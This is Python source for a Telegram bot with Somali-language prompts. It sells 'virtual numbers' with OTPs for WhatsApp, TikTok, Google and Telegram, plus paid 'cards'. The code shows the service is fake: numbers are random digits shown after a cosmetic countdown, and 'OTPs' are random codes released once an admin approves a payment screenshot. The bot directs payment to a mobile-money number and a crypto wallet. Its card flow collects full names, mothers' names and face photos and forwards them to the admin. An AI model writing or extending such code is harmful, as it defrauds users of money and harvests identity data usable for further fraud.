import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4, 9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec, 0, -1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"),
             KeyboardButton(text="Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_whatsapp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_tiktok")],
        [InlineKeyboardButton(text="Google", callback_data="v_google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)


# ===== PLATFORM SELECTED =====
@dp.callback_query(F.data.startswith("v_"))
async def virtual_platform(call: CallbackQuery, state: FSMContext):
    platform = call.data.split("_")[1]
    number = normal_number()

    users[call.from_user.id] = {
        "type": "virtual",
        "platform": platform,
        "number": number
    }

    # Animation Searching
    msg = await call.message.edit_text("Searching Number...")
    await countdown(msg, "Searching Number", 5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])

    await msg.edit_text(
        f"Number: {number}\n\n"
        "Dir Lacagta si aad u hesho OTP.",
        reply_markup=kb
    )


# ================= VIRTUAL LOCAL =================
@dp.callback_query(F.data == "v_local")
async def virtual_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])

    await call.message.edit_text(
        "Ku dir lacagta numberkan:\n\n"
        "+252907868526",
        reply_markup=kb
    )


# ================= VIRTUAL CRYPTO =================
@dp.callback_query(F.data == "v_crypto")
async def virtual_crypto(call: CallbackQuery):
    text = (
        "Dir Crypto:\n\n"
        "BNB:\n"
        "`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20:\n"
        "`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo si uu auto-copy u noqdo."
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM PAYMENT", callback_data="v_confirm")]
    ])

    await call.message.edit_text(text, reply_markup=kb)


# ================= CONFIRM PAYMENT =================
@dp.callback_query(F.data == "v_confirm")
async def virtual_confirm(call: CallbackQuery, state: FSMContext):
    await call.message.answer(
        "Soo dir Screenshot Payment si loo xaqiijiyo."
    )
    await state.set_state(CardState.payment_screenshot)


# ================= ADMIN RECEIVE VIRTUAL =================
@dp.message(CardState.payment_screenshot, F.photo)
async def receive_virtual_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id

    if uid not in users:
        return

    users[uid]["screenshot"] = msg.photo[-1].file_id

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{uid}")]
    ])

    await bot.send_photo(
        ADMIN_ID,
        users[uid]["screenshot"],
        caption=(
            f"Virtual Payment\n\n"
            f"User: {uid}\n"
            f"Platform: {users[uid]['platform']}\n"
            f"Number: {users[uid]['number']}"
        ),
        reply_markup=kb
    )

    await msg.answer("Codsigaaga waa La diray Fadlan Sug Xaqiijinta!⏳")
    await state.clear()


# ================= CARD =================
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)


@dp.callback_query(F.data.in_(["vip", "normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data == "vip" else normal_number()

    users[call.from_user.id] = {
        "type": "card",
        "level": call.data,
        "number": number
    }

    await call.message.answer("Fadlan geli Magacaaga Saddexan:")
    await state.set_state(CardState.full_name)


# ================= MAGAC =================
@dp.message(CardState.full_name)
async def get_name(msg: Message, state: FSMContext):
    if len(msg.text.split()) < 3:
        await msg.answer("Magac Saddexan sax ah geli.")
        return

    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)


# ================= MOTHER =================
@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga (Toosan oo cad):")
    await state.set_state(CardState.photo)


# ================= PHOTO =================
@dp.message(CardState.photo, F.photo)
async def get_photo(msg: Message, state: FSMContext):
    users[msg.from_user.id]["photo"] = msg.photo[-1].file_id

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="pay_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="pay_crypto")]
    ])

    await msg.answer("Dooro Payment Method:", reply_markup=kb)


# ================= LOCAL PAYMENT =================
@dp.callback_query(F.data == "pay_local")
async def pay_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_pay")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])

    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )


# ================= CRYPTO PAYMENT =================
@dp.callback_query(F.data == "pay_crypto")
async def pay_crypto(call: CallbackQuery):
    text = (
        "Send Crypto:\n\n"
        "BNB:\n"
        "`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20:\n"
        "`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo address-ka si uu auto-copy u noqdo."
    )

    await call.message.edit_text(text)


# ================= CONFIRM PAYMENT =================
@dp.callback_query(F.data == "confirm_pay")
async def confirm_pay(call: CallbackQuery, state: FSMContext):
    await call.message.answer(
        "Soo sawir Lacag bixintaada si loo xaqiijiyo (Screenshot Payment):"
    )
    await state.set_state(CardState.payment_screenshot)


# ================= SCREENSHOT =================
@dp.message(CardState.payment_screenshot, F.photo)
async def receive_screenshot(msg: Message, state: FSMContext):
    users[msg.from_user.id]["screenshot"] = msg.photo[-1].file_id

    await msg.answer("Payment Screenshot waa la helay ⏳ Sug Ansixinta Admin.")

    await state.clear()

# ================= CANCEL =================
@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")


# ================= ADMIN APPROVE =================
@dp.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    uid = int(call.data.split("_")[1])

    if uid not in users:
        await call.answer("User not found")
        return

    code = generate_code()
    users[uid]["code"] = code

    # Haddii Card yahay → dir xogta user-ka
    if users[uid]["type"] == "card":
        data = users[uid]

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="CHECK CODE",
                callback_data="go_check"
            )]
        ])

        await bot.send_message(
            uid,
            f"Payment Confirmed ✅\n\n"
            f"Code-kan ku qor CHECK CODE:\n\n"
            f"{code}",
            reply_markup=kb
        )

    # Haddii Virtual yahay
    if users[uid]["type"] == "virtual":
        await bot.send_message(
            uid,
            f"OTP Ready ✅\nCode: {code}\nNumber: {users[uid]['number']}"
        )

    await call.message.edit_text("Approved ✅")


# ================= ADMIN REJECT =================
@dp.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    uid = int(call.data.split("_")[1])

    if uid in users:
        await bot.send_message(uid, "Codsigaaga waa la diiday ❌")

    await call.message.edit_text("Rejected ❌")


# ================= AUTO 5 SEC WARNING =================
async def auto_warning(uid, message):
    await asyncio.sleep(5)
    if uid in users and "code" not in users[uid]:
        await bot.send_message(
            uid,
            "PLEASE SEND MONEY 💵\n+252907868526"
        )


# ================= CHECK CODE BUTTON =================
@dp.callback_query(F.data == "go_check")
async def go_check(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)


# ================= CHECK CODE MENU =================
@dp.message(F.text == "Check Code")
async def check_code_menu(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)


@dp.message(CodeState.code)
async def check_code_process(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code_input = msg.text.strip()

    if uid in users and users[uid].get("type") == "card":
        if users[uid].get("code") == code_input:
            await msg.answer(
                f"Code Confirmed ✅\nNumber-kaaga waa:\n{users[uid]['number']}"
            )
        else:
            await msg.answer("Code Khaldan ❌")
    else:
        await msg.answer("Ma jiro Card la helay.")

    await state.clear()


# ================= ADMIN RECEIVES FULL CARD INFO =================
@dp.message()
async def forward_card_to_admin(msg: Message):
    uid = msg.from_user.id

    if uid in users and users[uid].get("type") == "card":
        data = users[uid]

        if "screenshot" in data:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="APPROVE",
                    callback_data=f"approve_{uid}"
                )],
                [InlineKeyboardButton(
                    text="REJECT",
                    callback_data=f"reject_{uid}"
                )]
            ])

            await bot.send_photo(
                ADMIN_ID,
                data["photo"],
                caption=(
                    f"Card Request\n\n"
                    f"User: {uid}\n"
                    f"Level: {data['level']}\n"
                    f"Number: {data['number']}\n"
                    f"Name: {data['name']}\n"
                    f"Mother: {data['mother']}"
                ),
                reply_markup=kb
            )

            await bot.send_photo(
                ADMIN_ID,
                data["screenshot"],
                caption="Payment Screenshot"
            )


# ================= MAIN RUN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
